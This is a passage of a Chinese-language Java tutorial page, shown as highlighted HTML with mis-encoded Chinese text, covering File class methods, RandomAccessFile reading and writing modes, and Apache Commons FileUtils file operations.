class="title class_">File</span>(<span class="string">&quot;example/test.txt&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;ç›¸å¯¹è·¯å¾„ï¼š&quot;</span> + relativeFile.getPath());</span><br></pre></td></tr></table></figure></li><li>åˆ¤æ–­åŠŸèƒ½çš„æ–¹æ³•<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ¤æ–­æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</span></span><br><span class="line"><span class="keyword">if</span> (file.exists()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;æ–‡ä»¶æˆ–ç›®å½•ä¸å­˜åœ¨&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦æ˜¯ç›®å½•</span></span><br><span class="line"><span class="keyword">if</span> (file.isDirectory()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;æ˜¯ç›®å½•&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;ä¸æ˜¯ç›®å½•&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ¤æ–­æ˜¯å¦æ˜¯æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (file.isFile()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;æ˜¯æ–‡ä»¶&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;ä¸æ˜¯æ–‡ä»¶&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>åˆ›å»ºã€åˆ é™¤åŠŸèƒ½çš„æ–¹æ³•<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºæ–‡ä»¶</span></span><br><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/test.txt&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (file.createNewFile()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ›å»ºæ–‡ä»¶æˆåŠŸï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ›å»ºæ–‡ä»¶å¤±è´¥ï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ é™¤æ–‡ä»¶</span></span><br><span class="line"><span class="keyword">if</span> (file.delete()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ é™¤æ–‡ä»¶æˆåŠŸï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ é™¤æ–‡ä»¶å¤±è´¥ï¼š&quot;</span> + file.getAbsolutePath());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºå¤šçº§ç›®å½•</span></span><br><span class="line"><span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/username/example/subdir1/subdir2&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (directory.mkdirs()) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ›å»ºç›®å½•æˆåŠŸï¼š&quot;</span> + directory.getAbsolutePath());</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;åˆ›å»ºç›®å½•å¤±è´¥ï¼š&quot;</span> + directory.getAbsolutePath());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>éå†ç›®å½•<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/itwanger/Documents/Github/paicoding&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å</span></span><br><span class="line">String[] files = directory.list();</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•ä¸‹çš„æ–‡ä»¶åï¼š&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (String file : files) &#123;</span><br><span class="line">    System.out.println(file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•</span></span><br><span class="line">File[] filesAndDirs = directory.listFiles();</span><br><span class="line">System.out.println(<span class="string">&quot;ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•ï¼š&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (File fileOrDir : filesAndDirs) &#123;</span><br><span class="line">    <span class="keyword">if</span> (fileOrDir.isFile()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ–‡ä»¶ï¼š&quot;</span> + fileOrDir.getName());</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileOrDir.isDirectory()) &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;ç›®å½•ï¼š&quot;</span> + fileOrDir.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>é€’å½’éå†<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/Users/itwanger/Documents/Github/paicoding&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€’å½’éå†ç›®å½•ä¸‹çš„æ–‡ä»¶å’Œå­ç›®å½•</span></span><br><span class="line">    traverseDirectory(directory);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">traverseDirectory</span><span class="params">(File directory)</span> &#123;</span><br><span class="line">    <span class="comment">// åˆ—å‡ºç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•</span></span><br><span class="line">    File[] filesAndDirs = directory.listFiles();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// éå†æ¯ä¸ªæ–‡ä»¶å’Œå­ç›®å½•</span></span><br><span class="line">    <span class="keyword">for</span> (File fileOrDir : filesAndDirs) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileOrDir.isFile()) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜¯æ–‡ä»¶ï¼Œè¾“å‡ºæ–‡ä»¶å</span></span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶ï¼š&quot;</span> + fileOrDir.getName());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileOrDir.isDirectory()) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ˜¯ç›®å½•ï¼Œé€’å½’éå†å­ç›®å½•</span></span><br><span class="line">            System.out.println(<span class="string">&quot;ç›®å½•ï¼š&quot;</span> + fileOrDir.getName());</span><br><span class="line">            traverseDirectory(fileOrDir);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="RandomAccessFile"><a href="#RandomAccessFile" class="headerlink" title="RandomAccessFile"></a>RandomAccessFile</h3><p>RandomAccessFile æ˜¯ Java ä¸­ä¸€ä¸ªéå¸¸ç‰¹æ®Šçš„ç±»ï¼Œå®ƒæ—¢å¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥å†™å…¥æ–‡ä»¶ã€‚ä¸å…¶ä»– IO ç±»ï¼ˆå¦‚ FileInputStream å’Œ FileOutputStreamï¼‰ä¸åŒï¼ŒRandomAccessFile å…è®¸æ‚¨è·³è½¬åˆ°æ–‡ä»¶çš„ä»»ä½•ä½ç½®ï¼Œä»é‚£é‡Œå¼€å§‹è¯»å–æˆ–å†™å…¥ã€‚è¿™ä½¿å¾—å®ƒç‰¹åˆ«é€‚ç”¨äºéœ€è¦åœ¨æ–‡ä»¶ä¸­éšæœºè®¿é—®æ•°æ®çš„åœºæ™¯ï¼Œå¦‚æ•°æ®åº“ç³»ç»Ÿã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.RandomAccessFile;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RandomAccessFileDemo</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">filePath</span> <span class="operator">=</span> <span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ RandomAccessFile å†™å…¥æ–‡ä»¶</span></span><br><span class="line">            writeToFile(filePath, <span class="string">&quot;Hello, æ²‰é»˜ç‹äºŒ!&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// ä½¿ç”¨ RandomAccessFile è¯»å–æ–‡ä»¶</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> readFromFile(filePath);</span><br><span class="line">            System.out.println(<span class="string">&quot;æ–‡ä»¶å†…å®¹: &quot;</span> + content);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">writeToFile</span><span class="params">(String filePath, String content)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(filePath, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶æœ«å°¾ï¼ˆåœ¨æ­¤å¤„è¿½åŠ å†…å®¹ï¼‰</span></span><br><span class="line">            randomAccessFile.seek(randomAccessFile.length());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// å†™å…¥å†…å®¹</span></span><br><span class="line">            randomAccessFile.writeUTF(content);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">readFromFile</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">content</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">randomAccessFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(filePath, <span class="string">&quot;r&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶å¼€å§‹å¤„ï¼ˆä»å¤´å¼€å§‹è¯»å–ï¼‰</span></span><br><span class="line">            randomAccessFile.seek(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            content.append(randomAccessFile.readUTF());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> content.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>RandomAccessFile ä¸»è¦æœ‰ä¸¤ä¸ªæ„é€ æ–¹æ³•ï¼š</p><ul><li><code>RandomAccessFile(File file, String mode)</code>ï¼šä½¿ç”¨ç»™å®šçš„æ–‡ä»¶å¯¹è±¡å’Œè®¿é—®æ¨¡å¼åˆ›å»ºä¸€ä¸ªæ–°çš„ RandomAccessFile å®ä¾‹ã€‚</li><li><code>RandomAccessFile(String name, String mode)</code>ï¼šä½¿ç”¨ç»™å®šçš„æ–‡ä»¶åå’Œè®¿é—®æ¨¡å¼åˆ›å»ºä¸€ä¸ªæ–°çš„ RandomAccessFile å®ä¾‹ã€‚</li></ul><p>è®¿é—®æ¨¡å¼ mode çš„å€¼å¯ä»¥æ˜¯ï¼š</p><ul><li>â€œrâ€ï¼šä»¥åªè¯»æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚è°ƒç”¨ç»“æœå¯¹è±¡çš„ä»»ä½• write æ–¹æ³•éƒ½å°†å¯¼è‡´ IOExceptionã€‚</li><li>â€œrwâ€ï¼šä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶ä¸å­˜åœ¨ï¼Œå®ƒå°†è¢«åˆ›å»ºã€‚</li><li>â€œrwsâ€ï¼šä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œå¹¶è¦æ±‚å¯¹å†…å®¹æˆ–å…ƒæ•°æ®çš„æ¯ä¸ªæ›´æ–°éƒ½è¢«ç«‹å³å†™å…¥åˆ°åº•å±‚å­˜å‚¨è®¾å¤‡ã€‚è¿™ç§æ¨¡å¼æ˜¯åŒæ­¥çš„ï¼Œå¯ä»¥ç¡®ä¿åœ¨ç³»ç»Ÿå´©æºƒæ—¶ä¸ä¼šä¸¢å¤±æ•°æ®ã€‚</li><li>â€œrwdâ€ï¼šä¸â€œrwsâ€ç±»ä¼¼ï¼Œä»¥è¯»å†™æ¨¡å¼æ‰“å¼€æ–‡ä»¶ï¼Œä½†ä»…è¦æ±‚å¯¹æ–‡ä»¶å†…å®¹çš„æ›´æ–°è¢«ç«‹å³å†™å…¥ã€‚å…ƒæ•°æ®å¯èƒ½ä¼šè¢«å»¶è¿Ÿå†™å…¥ã€‚</li></ul><p>ä¸»è¦æ–¹æ³•</p><ul><li><code>long getFilePointer()</code>ï¼šè¿”å›æ–‡ä»¶æŒ‡é’ˆçš„å½“å‰ä½ç½®ã€‚</li><li><code>long length()</code>ï¼šè¿”å›æ­¤æ–‡ä»¶çš„é•¿åº¦ã€‚</li><li><code>int read()</code>ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å–ä¸€ä¸ªå­—èŠ‚æ•°æ®ã€‚</li><li><code>int read(byte[] b)</code>ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å–å­—èŠ‚æ•°æ®å¹¶å°†å…¶å­˜å‚¨åˆ°æŒ‡å®šçš„å­—èŠ‚æ•°ç»„ä¸­ã€‚</li><li><code>int read(byte[] b, int off, int len)</code>ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å–å­—èŠ‚æ•°æ®å¹¶å°†å…¶å­˜å‚¨åˆ°æŒ‡å®šçš„å­—èŠ‚æ•°ç»„ä¸­ï¼Œä»åç§»é‡ off å¼€å§‹ï¼Œæœ€å¤šè¯»å– len ä¸ªå­—èŠ‚ã€‚</li><li><code>String readLine()</code>ï¼šä»è¯¥æ–‡ä»¶ä¸­è¯»å–ä¸€è¡Œæ–‡æœ¬ã€‚</li><li><code>readUTF()</code>ï¼šä»æ–‡ä»¶è¯»å– UTF-8 ç¼–ç çš„å­—ç¬¦ä¸²ã€‚æ­¤æ–¹æ³•é¦–å…ˆè¯»å–ä¸¤ä¸ªå­—èŠ‚çš„é•¿åº¦ä¿¡æ¯ï¼Œç„¶åæ ¹æ®è¿™ä¸ªé•¿åº¦è¯»å–å­—ç¬¦ä¸²çš„ UTF-8 å­—èŠ‚ã€‚æœ€åï¼Œè¿™äº›å­—èŠ‚è¢«è½¬æ¢ä¸º Java å­—ç¬¦ä¸²ã€‚è¿™æ„å‘³ç€å½“ä½ ä½¿ç”¨ readUTF æ–¹æ³•è¯»å–å­—ç¬¦ä¸²æ—¶ï¼Œéœ€è¦ç¡®ä¿æ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²æ˜¯ä½¿ç”¨ writeUTF æ–¹æ³•å†™å…¥çš„ï¼Œè¿™æ ·å®ƒä»¬ä¹‹é—´çš„é•¿åº¦ä¿¡æ¯å’Œç¼–ç æ–¹å¼æ‰èƒ½ä¿æŒä¸€è‡´ã€‚</li><li><code>void seek(long pos)</code>ï¼šå°†æ–‡ä»¶æŒ‡é’ˆè®¾ç½®åˆ°æ–‡ä»¶ä¸­çš„ pos ä½ç½®ã€‚</li><li><code>void write(byte[] b)</code>ï¼šå°†æŒ‡å®šçš„å­—èŠ‚æ•°ç»„çš„æ‰€æœ‰å­—èŠ‚å†™å…¥è¯¥æ–‡ä»¶ã€‚</li><li><code>void write(byte[] b, int off, int len)</code>ï¼šå°†æŒ‡å®šå­—èŠ‚æ•°ç»„çš„éƒ¨åˆ†å­—èŠ‚å†™å…¥è¯¥æ–‡ä»¶ï¼Œä»åç§»é‡ off å¼€å§‹ï¼Œå†™å…¥ len ä¸ªå­—èŠ‚ã€‚</li><li><code>void write(int b)</code>ï¼šå°†æŒ‡å®šçš„å­—èŠ‚å†™å…¥è¯¥æ–‡ä»¶ã€‚</li><li><code>writeUTF(String str)</code>ï¼šå°†ä¸€ä¸ªå­—ç¬¦ä¸²ä»¥ UTF-8 ç¼–ç å†™å…¥æ–‡ä»¶ã€‚æ­¤æ–¹æ³•é¦–å…ˆå†™å…¥ä¸¤ä¸ªå­—èŠ‚çš„é•¿åº¦ä¿¡æ¯ï¼Œè¡¨ç¤ºå­—ç¬¦ä¸²çš„ UTF-8 å­—èŠ‚é•¿åº¦ï¼Œç„¶åå†™å…¥ UTF-8 å­—èŠ‚æœ¬èº«ã€‚å› æ­¤ï¼Œå½“ä½ ä½¿ç”¨ writeUTF å†™å…¥å­—ç¬¦ä¸²æ—¶ï¼Œå®é™…å†™å…¥çš„å­—èŠ‚æ•°ä¼šæ¯”å­—ç¬¦ä¸²çš„ UTF-8 å­—èŠ‚é•¿åº¦å¤šä¸¤ä¸ªå­—èŠ‚ã€‚è¿™ä¸¤ä¸ªå­—èŠ‚ç”¨äºåœ¨è¯»å–å­—ç¬¦ä¸²æ—¶ç¡®å®šæ­£ç¡®çš„å­—ç¬¦ä¸²é•¿åº¦ã€‚</li></ul><p>å†æ¥çœ‹ä¸€ä¸ªç¤ºä¾‹ï¼Œç»“åˆå‰é¢çš„è®²è§£ï¼Œå°±ä¼šå½»åº•æŒæ¡ RandomAccessFileã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;logs/javabetter/itwanger.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> (<span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(file, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// å†™å…¥æ–‡ä»¶</span></span><br><span class="line">    raf.writeUTF(<span class="string">&quot;Hello, æ²‰é»˜ç‹äºŒ!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†æ–‡ä»¶æŒ‡é’ˆç§»åŠ¨åˆ°æ–‡ä»¶å¼€å¤´</span></span><br><span class="line">    raf.seek(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–æ–‡ä»¶å†…å®¹</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> raf.readUTF();</span><br><span class="line">    System.out.println(<span class="string">&quot;å†…å®¹: &quot;</span> + content);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Apache-FileUtils-ç±»"><a href="#Apache-FileUtils-ç±»" class="headerlink" title="Apache FileUtils ç±»"></a>Apache FileUtils ç±»</h3><p>FileUtils ç±»æ˜¯ Apache Commons IO åº“ä¸­çš„ä¸€ä¸ªç±»ï¼Œæä¾›äº†ä¸€äº›æ›´ä¸ºæ–¹ä¾¿çš„æ–¹æ³•æ¥æ“ä½œæ–‡ä»¶æˆ–ç›®å½•ã€‚</p><h4 id="1ï¼‰å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼š"><a href="#1ï¼‰å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼š" class="headerlink" title="1ï¼‰å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼š"></a><strong>1ï¼‰å¤åˆ¶æ–‡ä»¶æˆ–ç›®å½•ï¼š</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/src/file&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/dest/file&quot;</span>);</span><br><span class="line"><span class="comment">// å¤åˆ¶æ–‡ä»¶</span></span><br><span class="line">FileUtils.copyFile(srcFile, destFile);</span><br><span class="line"><span class="comment">// å¤åˆ¶ç›®å½•</span></span><br><span class="line">FileUtils.copyDirectory(srcFile, destFile);</span><br></pre></td></tr></table></figure><h4 id="2ï¼‰åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼š"><a href="#2ï¼‰åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼š" class="headerlink" title="2ï¼‰åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼š"></a><strong>2ï¼‰åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•ï¼š</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/file&quot;</span>);</span><br><span class="line"><span class="comment">// åˆ é™¤æ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line">FileUtils.delete(file);</span><br></pre></td></tr></table></figure><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¦åˆ é™¤ä¸€ä¸ªéç©ºç›®å½•ï¼Œéœ€è¦å…ˆåˆ é™¤ç›®å½•ä¸­çš„æ‰€æœ‰æ–‡ä»¶å’Œå­ç›®å½•ã€‚</p><h4 id="3ï¼‰ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼š"><a href="#3ï¼‰ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼š" class="headerlink" title="3ï¼‰ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼š"></a><strong>3ï¼‰ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•ï¼š</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">srcFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/src/file&quot;</span>);</span><br><span class="line"><span class="type">File</span> <span class="variable">destFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/dest/file&quot;</span>);</span><br><span class="line"><span class="comment">// ç§»åŠ¨æ–‡ä»¶æˆ–ç›®å½•</span></span><br><span class="line">FileUtils.moveFile(srcFile, destFile);</span><br></pre></td></tr></table></figure><h4 id="4ï¼‰æŸ¥è¯¢æ–‡ä»¶æˆ–ç›®å½•çš„ä¿¡æ¯ï¼š"><a href="#4ï¼‰æŸ¥è¯¢æ–‡ä»¶æˆ–ç›®å½•çš„ä¿¡æ¯ï¼š" class="headerlink" title="4ï¼‰æŸ¥è¯¢æ–‡ä»¶æˆ–ç›®å½•çš„ä¿¡æ¯ï¼š"></a><strong>4ï¼‰æŸ¥è¯¢æ–‡ä»¶æˆ–ç›®å½•çš„ä¿¡æ¯ï¼š</strong></h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;path/to/file&quot;</span>);</span><br><span class="line"><span class="comment">// è·å–æ–‡ä»¶æˆ–ç›®å½•çš„ä¿®æ”¹æ—¶é—´</span></span><br><span class="line"><span class="type">Date</span> <span class="variable">modifyTime</span> <span class="operator">=</span> FileUtils.lastModified(file);</span><br><span class="line"><span 